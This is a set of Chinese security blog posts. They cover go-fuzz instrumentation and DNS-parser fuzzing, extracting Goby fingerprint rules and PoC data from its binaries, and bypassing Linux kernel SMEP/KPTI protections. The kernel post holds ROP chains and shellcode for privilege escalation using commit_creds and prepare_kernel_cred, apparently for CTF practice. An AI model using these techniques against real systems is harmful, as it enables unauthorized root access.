    case *ast.ExprStmt:
        // Calls to panic change the flow.
        // We really should verify that "panic" is the predefined function,
        // but without type checking we can't and the likelihood of it being
        // an actual problem is vanishingly small.
        if call, ok := s.X.(*ast.CallExpr); ok {
            if ident, ok := call.Fun.(*ast.Ident); ok &amp;&amp; ident.Name == "panic" &amp;&amp; len(call.Args) == 1 {
                return true
            }
        }
    }
    found, _ := hasFuncLiteral(s)
    return found
}

其实就是大量的switch语句，如果是的话，就可以将直接边界作为end进行插桩，这一步的意义其实就是在于把{}里面的body不断的分割成一个个可以影响控制流的小块进行分别插桩。其实到这里我们就可以洞悉go-fuzz整个的插桩思想：在语法分析的时候就通过go-fuzz本身所包含的一个包的内容插桩到各个可以影响控制流的语句块中，那么接下来对应的工作就应该是如何对这些进行插桩语句块进行感知，这其实就是Sonar结构体的作用，这是go-fuzz发明的声呐系统。
Sonar遍历​        Sonar结构体同样实现了Visit方法来用于遍历语法树，部分源码如下：
func (s *Sonar) Visit(n ast.Node) ast.Visitor {
switch nn := n.(type) {
    case *ast.BinaryExpr:
        break
......
case *ast.SwitchStmt:
        if nn.Tag == nil || nn.Body == nil {
            return s // recurse
        }
        // Replace:
        //    switch a := foo(); bar(a) {
        //    case x: ...
        //    case y: ...
        //    }
        // with:
        //    switch {
        //    default:
        //        a := foo()
        //        __tmp := bar(a)
        //        switch {
        //        case __tmp == x: ...
        //        case __tmp == y: ...
        //        }
        //    }
        // The == comparisons will be instrumented later when we recurse.
        sw := new(ast.SwitchStmt)
        *sw = *nn
        var stmts []ast.Stmt
        if sw.Init != nil {
            stmts = append(stmts, sw.Init)
            sw.Init = nil
        }
        const tmpvar = "__go_fuzz_tmp"
        tmp := ast.NewIdent(tmpvar)
        typ := s.info.Types[sw.Tag]
        s.info.Types[tmp] = typ
        stmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{tmp}, Tok: token.DEFINE, Rhs: []ast.Expr{sw.Tag}})
        stmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{ast.NewIdent("_")}, Tok: token.ASSIGN, Rhs: []ast.Expr{tmp}})
        sw.Tag = nil
        stmts = append(stmts, sw)
        for _, cas1 := range sw.Body.List {
            cas := cas1.(*ast.CaseClause)
            for i, expr := range cas.List {
                tmp := &amp;ast.Ident{Name: tmpvar, NamePos: expr.Pos()}
                s.info.Types[tmp] = typ
                cas.List[i] = &amp;ast.BinaryExpr{X: tmp, Op: token.EQL, Y: expr}
            }
        }
        nn.Tag = nil
        nn.Init = nil
        nn.Body = &amp;ast.BlockStmt{List: []ast.Stmt{&amp;ast.CaseClause{Body: stmts}}}
        return s // recurse
......
}

第一步先根据节点类型找到Switch和For这种结构进行语法树级别的变化，整体的替换逻辑已经在注释里面体现出来了，其实就是类似把switch的条件都提出来放在body内部，然后再body里面建立一个新的switch结构，主要作用可能就是方便识别和统计，对于ast.BinaryExpr结构则是通过自定义的flag进行标注。
​        整体来看其实就是对包内代码各种语法树节点进行类型检查和过滤，因为一些代码是肯定顺序执行的，然后再需要的地方都插入一些标志，同时在结构体里面记录标志的总量，方便在fuzz执行的时候确定自己的代码位置从而更方便进行统计，具体的可以细看相关代码。
插桩总结​        其实无论是File还是Sonar，个人认为都算是一种插桩，方便对代码覆盖率进行统计，在结束之后都通过createFuzzMain函数进行了封装，这个地方其实也是go-fuzz不支持fuzz的代码包含main函数的具体原因：
func (c *Context) createFuzzMain() string {
    mainPkg := filepath.Join(c.fuzzpkg.PkgPath, "go.fuzz.main")
    path := filepath.Join(c.workdir, "gopath", "src", mainPkg)
    c.mkdirAll(path)
    c.writeFile(filepath.Join(path, "main.go"), c.funcMain())
    return mainPkg
}

其实就是将已经写好的main函数模板写入：
var ainSrc = template.Must(template.New("main").Parse(`
package main

import (
    target "{{.Pkg}}"
    dep "go-fuzz-dep"
)

func main() {
    fns := []func([]byte)int {
        {{range .AllFuncs}}
            target.{{.}},
        {{end}}
    }
    dep.Main(fns)
}
`))

主要作用还是调用包内的Fuzz代码。
go-fuzz
首先通过丢弃触发相同代码路径的的样本来最小化语料库。
开始改变输入并将数据传递给Fuzz函数，不失败（return 1），然后扩展代码覆盖率的突变会被保留和迭代形成新的样本。
当程序出现Crash的时候，会保存报告并重新启动程序。

Fuzz这块的具体原理其实都是参考的AFL，就不多说了，详细也可以参考AFL的Fuzz方式和源码。
测试用例​        首先简单介绍一下go的Fuzz函数的基本信息：
func Fuzz(data []byte) int {

}

该函数以int作为返回值，因此当其返回值为0的时候说明Fuzz对于数据不敢影响，可能的原因是测试目标发生了无意义的错误，比如输入内容不合法等，返回值为1说明该数据已经被成功解析，简单来说就是Fuzz输入的data被目标所接受。
DNS解析器Fuzz首先第一步是创建初始语料库，其实就是通过拆解pcap数据包来创造数据：
package main

import (
    "crypto/rand"
    "encoding/hex"
    "log"
    "os"
    "strconv"

    "github.com/miekg/pcap"
)

func fatalIfErr(err error) {
    if err != nil {
        log.Fatal(err)
    }
}

func main() {
    handle, err := pcap.OpenOffline(os.Args[1])
    fatalIfErr(err)

    b := make([]byte, 4)
    _, err = rand.Read(b)
    fatalIfErr(err)
    prefix := hex.EncodeToString(b)

    i := 0
    for pkt := handle.Next(); pkt != nil; pkt = handle.Next() {
        pkt.Decode()

        f, err := os.Create("p_" + prefix + "_" + strconv.Itoa(i))
        fatalIfErr(err)
        _, err = f.Write(pkt.Payload)
        fatalIfErr(err)
        fatalIfErr(f.Close())

        i++
    }
}

编写初步的Fuzz函数：
func Fuzz(rawMsg []byte) int {
    msg := &amp;dns.Msg{}

    if unpackErr := msg.Unpack(rawMsg); unpackErr != nil {
        return 0
    }

    if _, packErr = msg.Pack(); packErr != nil {
        println("failed to pack back a message")
        spew.Dump(msg)
        panic(packErr)
    }

    return 1
}

作者在发现了越界：
func unpackTxt(msg []byte, offset, rdend int) ([]string, int, error) {
    var err error
    var ss []string
    var s string
    for offset &lt; rdend &amp;&amp; err == nil {
        s, offset, err = unpackTxtString(msg, offset)
        if err == nil {
            ss = append(ss, s)
        }
    }
    return ss, offset, err
}

但是因为这些越界使得程序经常崩溃，并且Fuzz变的缓慢，于是作者先进行了阶段性的修复工作，主要修复是使用len(msg)而不是使用保留的偏移量：
func unpackTxt(msg []byte, off0 int) (ss []string, off int, err error) {
    off = off0
    var s string
    for off &lt; len(msg) &amp;&amp; err == nil {
        s, off, err = unpackTxtString(msg, off)
        if err == nil {
            ss = append(ss, s)
        }
    }
    return
}

之后修改好的Fuzz，主要的修改在于增加了ParseDNSPacketSafely，并抛弃了一些无意义的错误，也可能不断测试，不断排除已知的错误:
func Fuzz(rawMsg []byte) int {
    var (
        msg, msgOld = &amp;dns.Msg{}, &amp;old.Msg{}
        buf, bufOld = make([]byte, 100000), make([]byte, 100000)
        res, resOld []byte

        unpackErr, unpackErrOld error
        packErr, packErrOld     error
    )

    unpackErr = msg.Unpack(rawMsg)
    unpackErrOld = ParseDNSPacketSafely(rawMsg, msgOld)

    if unpackErr != nil &amp;&amp; unpackErrOld != nil {
        return 0
    }

    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: out of order NSEC block" {
        // 97b0a31 - rewrite NSEC bitmap [un]packing to account for out-of-order
        return 0
    }

    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: bad rdlength" {
        // 3157620 - unpackStructValue: drop rdlen, reslice msg instead
        return 0
    }

    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: bad address family" {
        // f37c7ea - Reject a bad EDNS0_SUBNET family on unpack (not only on pack)
        return 0
    }

    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: bad netmask" {
        // 6d5de0a - EDNS0_SUBNET: refactor netmask handling
        return 0
    }

    if unpackErr != nil &amp;&amp; unpackErrOld == nil {
        println("new code fails to unpack valid packets")
        panic(unpackErr)
    }

    res, packErr = msg.PackBuffer(buf)

    if packErr != nil {
        println("failed to pack back a message")
        spew.Dump(msg)
        panic(packErr)
    }

    if unpackErrOld == nil {

        resOld, packErrOld = msgOld.PackBuffer(bufOld)

        if packErrOld == nil &amp;&amp; !bytes.Equal(res, resOld) {
            println("new code changed behavior of valid packets:")
            println()
            println(hex.Dump(res))
            println(hex.Dump(resOld))
            os.Exit(1)
        }

    }

    return 1
}

Tips：
​        其实在Fuzz过程中也会遇到一些结构化的问题，毕竟大型项目都会存在大量的复杂结构体难以变异，这时候才为大家提供一个神器go-fuzz-header：

https://adalogics.com/blog/structure-aware-go-fuzzing-complex-types

云原生下的Fuzz思考​        云原生的很多新技术其实都是在老技术的交叉上形成的，其实可以类似go项目结构里面的不同的包，对于很多Fuzz目标来言，像以前那样直接从最根本处下手已经不太现实可行，比如容器Fuzz其实很难通过生成大量镜像或者docker client的命令来解决，恰恰相反深入程序内部针对不同函数来编写Fuzz或许更有价值。
​        但是缺点也很明显，首先必须和代码审计相结合，其次就是由于代码是否用户可达或者crash是否真的引发漏洞效果都有待评估，正如go-fuzz创始人所说：“go-fuzz其实更适合开发者来寻求自己项目中存在的bug”，但是漏洞挖掘技术也是在不断的进步之中，或许可以思考如何把找到的bug发展成漏洞，毕竟对于内存安全的高级语言来说直接谋求可利用漏洞相对困难。
​        其实在内存漏洞越来越少的现在，这种bug最终演变成漏洞的例子还是有的，就比如linux pkexec提权漏洞，过去几年大家都认为这是一个bug，但是等利用方式被真正发掘，就能变化成为严重的安全问题。
参考资料
https://github.com/dvyukov/go-fuzz

]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>Goby指纹与POC提取复现</title>
    <url>//post/Goby%E6%8C%87%E7%BA%B9%E5%92%8CPOC%E6%8F%90%E5%8F%96.html</url>
    <content><![CDATA[Goby指纹与POC提取复现最近看了w8ay师傅发的关于提取Goby指纹的帖子，发现自己加入师傅的知识星球却一直没认真学习过实在是难顶嗷，根据师傅的帖子来复现自己提取一下，补上第一期的作业。
Goby指纹提取首先是指纹提取，这里也分别准备了三个版本的Goby文件进行复现，分别是1.4.76、1.7.192和1.8.279
1.4.76因为版本比较低所以不需要我们手动去从goby程序里提crules，直接用winhex打开笔者从事的工作与Yara息息相关，但是从来没有深入的去了解Yara的原理和流程，只是把它当作加强版的正则，从来没有想过能用来进行指纹识别，愧疚愧疚~~
到这里已经看到出现指纹了，接下来就是将指纹提取出来，笔者在复现的时候起初以为自己写过Yara规则，猜测每个规则都是rule_id开头，然后后面跟字段，妹有好好观察，最后还是老老实实寻找开始和结束段。我们提取的内容应该是以rules_0开始，按照师傅的文章正是从default之后开始进行提取，所以开始字段为64 65 66 61 75 6C 74 00 ，往下寻找结束的标记，从图上可以看出结束的标记为66 6F 65 79 65
接下来就是将这两段之间的内容提取出来，笔者最近正好在学习Go，就用Go写了个辣眼的提取脚本
package main

import (
&nbsp; &nbsp; "io/ioutil"
&nbsp; &nbsp; "fmt"
&nbsp; &nbsp; "strings"
&nbsp; &nbsp; "os"
)

func Read()(string){
&nbsp; &nbsp; f, err := ioutil.ReadFile("/home/ubuntu/go/gopro/crules")
&nbsp; &nbsp; if err != nil {
&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("read fail", err)
&nbsp; &nbsp; }
&nbsp; &nbsp; return string(f)
}

func Write(s string) &nbsp;{
&nbsp; &nbsp; fileName := "finger.txt"
&nbsp; &nbsp; var d1 = []byte(s)
&nbsp; &nbsp; f, err3 := os.Create(fileName) //创建文件
&nbsp; &nbsp; if err3 != nil{
&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("create file fail")
&nbsp; &nbsp; }
&nbsp; &nbsp; defer f.Close()
&nbsp; &nbsp; n2, err3 := f.Write(d1) //写入文件(字节数组)
&nbsp; &nbsp; fmt.Printf("写入 %d 个字节n", n2)
&nbsp; &nbsp; f.Sync()
}

func main() {
&nbsp; &nbsp; crules := Read()
&nbsp; &nbsp; start := strings.Index(crules, "\x64\x65\x66\x61\x75\x6C\x74\x00")
&nbsp; &nbsp; end := strings.Index(crules, "\x00\x00\x66\x6F\x65\x79\x65\x00")
&nbsp; &nbsp; finger := crules[start : end]
&nbsp; &nbsp; Write(finger)
}


真的辣眼睛，因为妹有做分割，真没眼看。。。。
接下来就是进行分割，观察不同的rule_id之间的字节
由此可以确定不同规则rule_id之间的分隔符为\x00\x00\x00\x00\x73\x00 ,不同字段之间的分隔符为\x00 
尝试对其进行拆分，这段写得太辣眼睛了，还是放师傅的脚本吧
filename = r"crules"
with open(filename, 'rb') as f:
&nbsp; &nbsp; data = f.read()
start = data.index(b"default\x00fofa")
end = data.index(b"\x00" * 16, start)
data = data[start:end]
datas = data.split(b"rule_id")[1:]
sep = b"\x00"
options_set = set()
results = []
for item in datas:
&nbsp; &nbsp; ff = item.split(sep)
&nbsp; &nbsp; rule_id = ff[1].decode()
&nbsp; &nbsp; level = ff[3].decode()
&nbsp; &nbsp; softhard = ff[5].decode()
&nbsp; &nbsp; product = ff[7].decode()
&nbsp; &nbsp; company = ff[9].decode()
&nbsp; &nbsp; category = ff[11].decode()
&nbsp; &nbsp; parent_category = ff[13].decode()
&nbsp; &nbsp; dd = {
&nbsp; &nbsp; &nbsp; &nbsp; "rule_id": rule_id,
&nbsp; &nbsp; &nbsp; &nbsp; "level": level,
&nbsp; &nbsp; &nbsp; &nbsp; "softhard": softhard,
&nbsp; &nbsp; &nbsp; &nbsp; "product": product,
&nbsp; &nbsp; &nbsp; &nbsp; "company": company,
&nbsp; &nbsp; &nbsp; &nbsp; "category": category,
&nbsp; &nbsp; &nbsp; &nbsp; "parent_category": parent_category,
&nbsp; &nbsp; &nbsp; &nbsp; "rules": []
&nbsp; &nbsp; }
&nbsp; &nbsp; bb = b'\x00'.join(ff[14:])
&nbsp; &nbsp; s = bb.split(b'\x00\x00\x00\x00\x73\x00')
&nbsp; &nbsp; _rr2 = []
&nbsp; &nbsp; for rr in s:
&nbsp; &nbsp; &nbsp; &nbsp; _rules = []
&nbsp; &nbsp; &nbsp; &nbsp; if not rr.startswith(b'fofa'):
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; continue
&nbsp; &nbsp; &nbsp; &nbsp; index = 0
&nbsp; &nbsp; &nbsp; &nbsp; while index &lt; len(rr):
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; prefixx = b"fofa\x00"
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try:
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; start = rr.index(prefixx, index) + len(prefixx)
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; except:
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end = rr.index(b'\x00', start)
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; match_way = rr[start:end].decode()
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _length = rr[end + 1]
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content = rr[end + 9:end + 9 + _length]
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; index = end + 9 + _length
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _rules.append(
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "match": match_way,
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "content": content.decode('utf-8', errors="ignore")
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )
&nbsp; &nbsp; &nbsp; &nbsp; _rr2.append(_rules)
&nbsp; &nbsp; dd["rules"] = _rr2
&nbsp; &nbsp; results.append(dd)
print(results)
with open("fofa.json", "w", encoding="utf-8") as f:
&nbsp; &nbsp; import json
&nbsp; &nbsp; json.dump(results, f, ensure_ascii=False, indent=4)

最后得到结果如下

1.7.1921.7.192版本不在含有crules文件，它被包含在了可执行程序中，打开可执行程序可以看到其中引用了github.com/rakyll/statik/fs 库，官方的描述如下：statik allows you to embed a directory of static files into your Go binary根据师傅的文章，我们也可以查看fs的源码fs.go的源码发现该库即是生成了ZIP内嵌在程序中笔者之前有过一些Misc经验（雾，这里列出常见的文件头



Type
文件头
文件尾



JEPG
FFD8FF
FFD9


PNG
89504E47
AE426082


GIF
47484638
003B


ZIP
504B0304
504B


TIFF
49492A00



XML
68746D6C3E



PDF
25504446



RAR
52617221



这里搜索ZIP的格式头50 4B 03 04 即可定位到压缩包的起始位置

看到crules，就应该是这个压缩包了，接下来就是寻找结尾进行提取压缩包文件。因为50 4B 03 04 这段数据在文本中有很多，在进行提取的时候可以多选几个字节进行准确定位，这里师傅网友多定了一个字节到50 4B 03 04 14 00 08 00 08 00
接下来寻找压缩包结尾，先看看50 4B 的搜索结果
在搜索开始头的时候就能看到存在这么多的50 4B 如果直接提取到下一个50 4B 无法判断压缩包的准确性，借鉴师傅的解决方法，每次读字节并且尝试解压，代码如下：
# @Author &nbsp;: w8ay
import zipfile
from io import BytesIO

filename = "goby-cmd-linux"
with open(filename, 'rb') as stream:
&nbsp; &nbsp; data = stream.read()
&nbsp; &nbsp; start = data.find(b'\x50\x4B\x03\x04\x14\x00\x08\x00\x08\x00')
&nbsp; &nbsp; end = start + 1200
while True:
&nbsp; &nbsp; fenli = data[start:end]
&nbsp; &nbsp; try:
&nbsp; &nbsp; &nbsp; &nbsp; fio = BytesIO(fenli)
&nbsp; &nbsp; &nbsp; &nbsp; f = zipfile.ZipFile(file=fio)
&nbsp; &nbsp; &nbsp; &nbsp; print(fenli[:100])
&nbsp; &nbsp; &nbsp; &nbsp; print(fenli[-10:])
&nbsp; &nbsp; &nbsp; &nbsp; print(len(fenli) // 1024)
&nbsp; &nbsp; &nbsp; &nbsp; print(f.namelist())
&nbsp; &nbsp; &nbsp; &nbsp; break
&nbsp; &nbsp; except zipfile.BadZipFile:
&nbsp; &nbsp; &nbsp; &nbsp; end += 1
with open("test.zip", 'wb') as f:
&nbsp; &nbsp; f.write(fenli)

成功分离出crules_1.7.192，用之前的提取脚本提取即可
这个微微离谱的指纹还在

Goby Poc提取Goby的POC分为json与go两种格式，本次只尝试提取json’格式（wtcldbq
用winhex打开可执行程序观察

可以直接确认Name段，那么提取数据的起始段也可以确认为\x23\x7B\x0A\x20\x20\x22\x4E\x61\x6D\x65\x22\x3A\x20（在看的时候搜索Name字段第二个处的CS字段与下面不同，不知道为啥师傅没有提取结束段标记为\x65\x0A\x7D\x0A\x66\x75\x6E\x63\x74\x69\x6F\x6E
暴力提取辣眼脚本：
package main

import (
&nbsp; &nbsp; "io/ioutil"
&nbsp; &nbsp; "fmt"
&nbsp; &nbsp; "strings"
&nbsp; &nbsp; "os"
)

func Read()(string){
&nbsp; &nbsp; f, err := ioutil.ReadFile("goby_1.8")
&nbsp; &nbsp; if err != nil {
&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("read fail", err)
&nbsp; &nbsp; }
&nbsp; &nbsp; return string(f)
}

func Write(s string) {
&nbsp; &nbsp; fileName := "finger.json"
&nbsp; &nbsp; var d1 = []byte(s)
&nbsp; &nbsp; f, err3 := os.Create(fileName) //创建文件
&nbsp; &nbsp; if err3 != nil{
&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("create file fail")
&nbsp; &nbsp; }
&nbsp; &nbsp; defer f.Close()
&nbsp; &nbsp; n2, err3 := f.Write(d1) //写入文件(字节数组)
&nbsp; &nbsp; fmt.Printf("写入 %d 个字节n", n2)
&nbsp; &nbsp; f.Sync()
}

func main() {
&nbsp; &nbsp; crules := Read()
&nbsp; &nbsp; start := strings.Index(crules, "\x23\x7B\x0A\x20\x20\x22\x4E\x61\x6D\x65\x22\x3A\x20")
&nbsp; &nbsp; end := strings.Index(crules, "\x65\x0A\x7D\x0A\x66\x75\x6E\x63\x74\x69\x6F\x6E")
&nbsp; &nbsp; finger := crules[start + 1 : end + 3]
&nbsp; &nbsp; Write(finger)
}

提取结果如下
但是存在一些不可见字符干扰，后续再优化
总结首先是 W8ay师傅太强了orz，后面到了逆向yara虚拟机的程度，对字符处理也很细节，学，学无止境。wtcl。。
以后要忠实的做好每一个大佬的舔狗

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 保护机制绕过</title>
    <url>//post/Linux%20Kernel%20%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87.html</url>
    <content><![CDATA[Linux Kernel 保护机制绕过
好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。

SMEP + KPTI bypass​        SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。
​        检测计算机是否开启SMEP保护的方式很简单，cat /proc/cpuinfo | grep smep，如果有匹配到一些信息的话就说明计算机开启了SMEP保护。在CTF赛事中一般会给一些kernel启动的sh脚本，从这些脚本里面我们也可以看出虚拟机在启动kernel时是否开启了SMEP保护：
#!/bin/sh

qemu-system-x86_64 -initrd initramfs.cpio \
-kernel bzImage \
-append 'console=ttyS0 oops=panic panic=1 nokaslr' \
-monitor /dev/null \
-m 64M --nographic \
-smp cores=1,threads=1 \

这里是没开启SMEP的脚本，如果在脚本里面加入SMEP相关的cpu参数那么就是开启了SMEP机制。
#!/bin/sh

qemu-system-x86_64 -initrd initramfs.cpio \
-kernel bzImage \
-append 'console=ttyS0 oops=panic panic=1 nokaslr' \
-monitor /dev/null \
-m 64M --nographic \
-smp cores=1,threads=1 \
-cpu kvm64,smep

还有一种判断SMEP机制是否开启的方法是通过cr4寄存器的值：
第20位代表的就是SMEP机制是否开启，获取cr4寄存器值的方法也很简单，一种可以通过debuger去attach要调试的kernel，另一种就是通过触发SMEP机制的crash
​        KPTI机制更多的是一种页表隔离的机制，当在用户态和内核态之间进行状态切换的时候KPTI机制会尽量减少用户态页表中的内核地址，同时内核页表中所有的用户态页都被设置为NX使得用户态的页不具备可执行权限，这是一种防范Meltdown类似攻击的机制。
​        检测KPTI机制是否开启的方法有很多，cat /proc/cpuinfo | grep pti或者类似上面说到的cpu参数-cpu kvm64,smep，或者检查进程页表，但是这需要你可以查看物理内存，通过内核任意读取的原语可以做到，但是需要进行虚拟地址和物理地址之间的转换，这就需要你具备一定的内存管理知识和多级页表相关知识，这些基础知识这里就不细说了，下面举例一些demo看如何获取相关物理地址。
void *pgd = get_current()-&gt;mm-&gt;pgd;

get_current() 会帮助获取当前的task_struct，然后得到mm_struct结构体类型的mm成员，所有的进程地址空间都包含该结构体里面，其中pgd字段代表的是全局页目录，拿到地址之后进行页表地址转换就可以拿到对应的物理地址，那么在多级页表的处理过程中可以拿到每一级页表的入口地址，该地址的NX bit就表明该页表是否开启了NX，结论就是，正常情况下每一级页表的NX位是没设置的，但是全局页目录设置了NX bit，因为在多级页表解析的过程中全局页目录是共享的。
ROP绕过​        内核里面的rop和用户态其实是非常相似的，做rop最基本的就是先获取到vmlinux，以ctf赛题来说一般提供的都是压缩后的bzImage，这里可以通过vmlinux-to-elf工具来实现解压缩：
./vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;

然后通过ROPgadget或者ropper从vmlinux里面获取gadget
ROPgadget --binary vmlinux &gt; gadgets

gadget的寻找原则其实不是固定的，要看场景丁需求，不过类似mov esp, 0xf7000000 ; ret这样的一般都很不错（注意常量一定要对齐），可以将esp指向我们分配的地址然后接下来的ret操作就容易被控制进而执行rop链。但是ROPgadget是不会检查相关段是否开启了NX的。
​        对于SMEP来说，它由cr4寄存器控制，因此可以通过改变cr4寄存器的第20 bit的值来进行绕过，比如使用native_write_cr4函数：
void native_write_cr4(unsigned long val)
{
    unsigned long bits_missing = 0;

set_register:
    asm volatile("mov %0,%%cr4": "+r" (val), "+m" (cr4_pinned_bits));

    if (static_branch_likely(&amp;cr_pinning)) {
        if (unlikely((val &amp; cr4_pinned_bits) != cr4_pinned_bits)) {
            bits_missing = ~val &amp; cr4_pinned_bits;
            val |= bits_missing;
            goto set_register;
        }
        /* Warn after we've set the missing bits. */
        WARN_ONCE(bits_missing, "CR4 bits went missing: %lx!?\n",
              bits_missing);
    }
}
EXPORT_SYMBOL(native_write_cr4);

但是从代码里面的警告就可以看出，在较新版本的内核中，该函数已经不能改变第20bit和第21bit的值了，
​        对于KPTI就比较麻烦了，一种方法是如果具备内核任意读写和当前进程页表的地址，那么就可以直接通过关闭NX bit来实现，但是都任意读写了，直接修改cred结构体可能会更香一点。那么最好的方式其实应该去利用kernel本身的代码来帮助实现这一绕过过程，下面是kernel entry的部分代码，主要是用于内核态到用户态的切换，这其实很符合exp的需求，原本exp不能成功执行的主要原因就是在返回用户态之后执行的代码所在页其实属于内核，这个切换它成功的进行了页表切换，因接下来用到的就是用户态的页表，。
GLOBAL(swapgs_restore_regs_and_return_to_usermode)
#ifdef CONFIG_DEBUG_ENTRY
    /* Assert that pt_regs indicates user mode. */
    testb    $3, CS(%rsp)
    jnz    1f
    ud2
1:
#endif
    POP_REGS pop_rdi=0

    /*
     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.
     * Save old stack pointer and switch to trampoline stack.
     */
    movq    %rsp, %rdi
    movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp

    /* Copy the IRET frame to the trampoline stack. */
    pushq    6*8(%rdi)    /* SS */
    pushq    5*8(%rdi)    /* RSP */
    pushq    4*8(%rdi)    /* EFLAGS */
    pushq    3*8(%rdi)    /* CS */
    pushq    2*8(%rdi)    /* RIP */

    /* Push user RDI on the trampoline stack. */
    pushq    (%rdi)

    /*
     * We are on the trampoline stack.  All regs except RDI are live.
     * We can do future final exit work right here.
     */
    STACKLEAK_ERASE_NOCLOBBER

    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi

    /* Restore RDI. */
    popq    %rdi
    SWAPGS
    INTERRUPT_RETURN

到此，其实就不难理解为什么kernel exp里面很多类似这样的ROP code:
    pivot_stack[0] = 0xcafedeadbeef;

    pivot_stack[i++] = pop_rdi;
    pivot_stack[i++] = 0;
    pivot_stack[i++] = prepare_kernel_cred;
    pivot_stack[i++] = pop_rdx;
    pivot_stack[i++] = 8;
    pivot_stack[i++] = cmp;
    pivot_stack[i++] = mov_rdi_rax;
    pivot_stack[i++] = commit_creds;

    pivot_stack[i++] = kpti_trampoline;
    pivot_stack[i++] = 0x12345678; // RAX
    pivot_stack[i++] = 0x87654321; // RDI
    pivot_stack[i++] = (unsigned long)u_code; //userspace_rip;
    pivot_stack[i++] = 0x33; //userspace_cs;
    pivot_stack[i++] = 0x246; //userspace_rflags;
    pivot_stack[i++] = (unsigned long)u_stack; //userspace_rsp;
    pivot_stack[i++] = 0x2b; //userspace_ss;

至于最开始的0xcafedeadbeef，这其实是为了触发page fault handler，因此根据linux demand-on-paging的原则，只有触发该handler的情况下才会真正mmaping。
​        还有一种方法是通过signal handler。
get root​        获取root权限的方式在内核里面还算比较统一的，基本很多都是通过

commit_creds(prepare_kernel_cred(0))。
确定cred structure结构体的地址来进行权限提升。
ctf里面可能会用到的方法就是通过chmod 修改flag文件为777权限然后挂起，然后通过用户空间的一个进程来读取文件内容。

​    那么shellcode的写法就比较直接了，假设通过cat /proc/kallsyms得到了grep commit_creds和grep prepare_kernel_cred的地址：
xor rdi, rdi
mov rcx, prepare_kernel_cred_addr
call rcx
mov rdi, rax
mov rcx, commit_creds_addr
call rcx
ret

这种shellcode没有做内核地址空间与用户地址空间的转换，因此可能比较局限，适用于仅仅存在一个retun 0类似指令的目标函数。为了适配更多的场景，需要做内核态和用户态的上下文切换，在linux kernel 源码中详细介绍了如何进入内核态：

64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,then loads new ss, cs, and rip from previously programmed MSRs.rflags gets masked by a value from another MSR (so CLD and CLACare not needed). SYSCALL does not save anything on the stackand does not change rsp.
注：MSR

从内核态返回用户态可以通过Linux提供的一些指令SYSRET，SYSEXIT，IRET，其中SYSRET和IRET可以适用于所有的CPU供应商，并且被包含在x86_64的标准里面，SYSRET需要利用MSR特殊读写指令因而较为麻烦，因此一般采用IRET。该指令的含义就是从中断返回，通过查看AMD64手册可以看出在保护模式下IRET对应IRETQ，那么我们只需要在执行IRETQ之前按顺序放置好RIP, CS, RFLAGS, RSP, SS，最后还需要知道的时候swapgs指令，它的语义是：Exchange GS base with KernelGSBase MSR，在linux syscall entry的代码哪里也存在该指令的调用，因此在通过system call返回用户空间的时候我们需要再做一次swapgs用于恢复GS。
swapgs

push userspace_ss
push userspace_rsp
push userspace_rflags
push userspace_cs
push userspace_rip
iretq

​        还有一种方法就是上述的第三条，第一步需要先找到chmod func的地址：

可以看到__x64_sys_chmod的地址是0xffffffff872dacf0，在内核调试中对该地址下断点就可以得到该如何给它附加参数：
    movzx  edx, word ptr [rdi + 0x68]
    mov    rsi, qword ptr [rdi + 0x70]
    mov    edi, 0xffffff9c
    call   0xffffffff811a1b50

